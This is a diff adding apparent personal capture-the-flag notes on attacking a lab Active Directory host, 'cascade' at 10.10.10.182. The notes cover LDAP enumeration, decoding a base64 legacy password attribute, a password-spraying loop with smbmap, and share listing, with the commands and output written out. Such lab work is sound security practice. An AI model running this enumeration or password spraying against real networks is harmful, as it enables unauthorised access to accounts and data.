@@ -1,0 +1,95 @@
+Port 5985/tcp is open so we could try connecting with EvilWinRm
+
+TODO: Perform a nslookup to look for the host name
+
+
+[Recon]
+
+* Looking for the domain name with a ldapsearch
+-- ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" -s base namingcontexts --
+
+#
+# LDAPv3
+# base <DC=cascade,DC=local> with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+
+* Using ldapsearch i came up with some users *
+ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=Person)'
+
+Interesting findings =>
+scriptPath: MapAuditDrive.vbs
+scriptPath: MapDataDrive.vbs
+
+cascadeLegacyPwd: "clk0bjVldmE=" for user "r.thompson"
+base64 decoding clk0bjVldmE= gives us "rY4n5eva"
+
+
+* Using smbmap with empty passwords and users retunrs nothing *
+smbmap -H 10.10.10.182 -d cascade.local -u '' -p ''
+
+
+* Trying to authenticate with smbmap for all user with the password we found *
+for user in $(cat users); do echo ${user}; smbmap -H 10.10.10.182 -d cascade.local -u ${user} -p 'rY4n5eva'; done
+
+CascGuest
+[!] Authentication error on 10.10.10.182
+CASC-DC1$
+[!] Authentication error on 10.10.10.182
+arksvc
+[!] Authentication error on 10.10.10.182
+s.smith
+[!] Authentication error on 10.10.10.182
+r.thompson
+[+] IP: 10.10.10.182:445	Name: cascade                                           
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	Audit$                                            	NO ACCESS	
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY	
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	print$                                            	READ ONLY	Printer Drivers
+	SYSVOL                                            	READ ONLY	Logon server share 
+util
+[!] Authentication error on 10.10.10.182
+j.wakefield
+[!] Authentication error on 10.10.10.182
+s.hickson
+[!] Authentication error on 10.10.10.182
+j.goodhand
+[!] Authentication error on 10.10.10.182
+a.turnbull
+[!] Authentication error on 10.10.10.182
+e.crowe
+[!] Authentication error on 10.10.10.182
+b.hanson
+[!] Authentication error on 10.10.10.182
+d.burman
+[!] Authentication error on 10.10.10.182
+BackupSvc
+[!] Authentication error on 10.10.10.182
+j.allen
+[!] Authentication error on 10.10.10.182
+i.croft
+[!] Authentication error on 10.10.10.182
+
+
+* Looking through the samba shares for interesting files *
+smbmap -H 10.10.10.182 -d cascade.local -u r.thompson -p 'rY4n5eva' -R 'Data'
+
+Found
+- Meeting_Notes_June_2018.html
+- ArkAdRecycleBin.log
+- dcdiag.log
+- VNC Install.reg
+- MapAuditDrive.vbs
+- MapDataDrive.vbs
+
+
+* Reading the meeting notes html we see that there was a TempAdmin account that was deleted 
+and as we see in a ArkAdRecycleBin.log file user ArkSvc indeed deleted him, maybe restoring the user
+gets us something *
